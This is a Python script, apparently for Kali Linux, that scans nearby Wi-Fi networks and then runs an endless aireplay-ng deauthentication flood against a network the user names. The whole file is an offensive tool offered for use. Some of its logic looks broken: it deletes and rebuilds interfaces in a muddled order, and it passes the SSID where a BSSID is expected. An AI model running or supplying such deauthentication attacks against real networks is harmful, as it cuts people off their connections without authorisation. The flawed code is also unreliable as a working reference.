# Code for deauth going to be here
from time import sleep, strftime
import pywifi
from pywifi import const
import os
import datetime
import subprocess

datum = datetime.datetime.now().strftime("%Y-%m-%d-%H:%M:%S")

reset = '\033[0m'
red = '\033[31m'
green = '\033[32m'
yellow = '\033[33m'
orange = '\033[33m\033[31m'
blue = '\033[34m'
magenta = '\033[35m'

folder = "/home/kali/Desktop/WiFiScanResult"

if not os.path.exists(folder):
    os.makedirs(folder)

filename = os.path.join(folder, f"{datum}.txt")

security_type_mapping = {
    const.AKM_TYPE_NONE: "None",
    const.AKM_TYPE_WPA: "WPA",
    const.AKM_TYPE_WPAPSK: "WPA-PSK",
    const.AKM_TYPE_WPA2: "WPA2",
    const.AKM_TYPE_WPA2PSK: "WPA2-PSK",
    const.AKM_TYPE_UNKNOWN: "Unknown",
}

def freq_to_channel(freq):
    if 2412 <= freq <= 2484:
        return (freq - 2412) // 5 + 1
    elif 5180 <= freq <= 5825:
        return (freq - 5180) // 5 + 36
    else:
        return None

def get_security_type_name(security_type):
    return security_type_mapping.get(security_type, "Unknown")

def scan_wifi():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    sleep(2)
    scan_results = iface.scan_results()

    for result in scan_results:
        ssid = result.ssid
        bssid = result.bssid
        freq = result.freq
        channel = freq_to_channel(freq)
        security_type = get_security_type_name(result.akm[0])
        signal_strength = result.signal

        print(f"\n\n[{magenta}+{reset}]" + "--" * 20 + f"[{magenta}+{reset}]")
        print(f"{yellow}SSID{reset}: {green}{ssid}{reset}")
        print(f"{yellow}MAC{reset} : {green}{bssid}{reset}")
        print(f"{yellow}CH{reset}  : {green}{channel}{reset}, {yellow}Freq: {reset}{green}{freq}{reset}")
        print(f"{yellow}SecType{reset}: {green}{security_type}{reset}")
        print(f"{yellow}Signal{reset} : {green}{signal_strength}{reset} {yellow}dB{reset}")
        print(f"[{magenta}+{reset}]" + "--" * 20 + f"[{magenta}+{reset}]")

def deauth_attack(target_ssid, iface):
    subprocess.run(["sudo", "iw", "dev", iface, "interface", "add", "mon0", "type", "monitor"])
    subprocess.run(["sudo", "ifconfig", "mon0", "up"])
    subprocess.run(["sudo", "iw", "mon0", "del"])
    subprocess.run(["sudo", "iw", "dev", iface, "del"])
    subprocess.run(["sudo", "iw", "dev", iface, "interface", "add", iface, "type", "managed"])
    subprocess.run(["sudo", "ifconfig", iface, "up"])

    while True:
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", target_ssid, iface])

def main():
    while True:
        print(f"[{magenta}+{reset}]" + "--" * 20 + f"[{magenta}+{reset}]\n")
        print(f"[{magenta}+{reset}] Starting WiFi Scanner & Deauthentication Attack [{magenta}+{reset}]")
        print(f"\nScanning nearby networks...\n")
        sleep(2)
        print(f"   : -------- {red}Scan Results{reset} --------:")
        scan_wifi()

        target_ssid = input("\nEnter the target SSID for deauthentication attack (Ctrl+C to exit): ")
        iface = input("Enter the WiFi adapter for attack (e.g., wlan0): ")

        deauth_attack(target_ssid, iface)
        sleep(3)

if __name__ == "__main__":
    main()
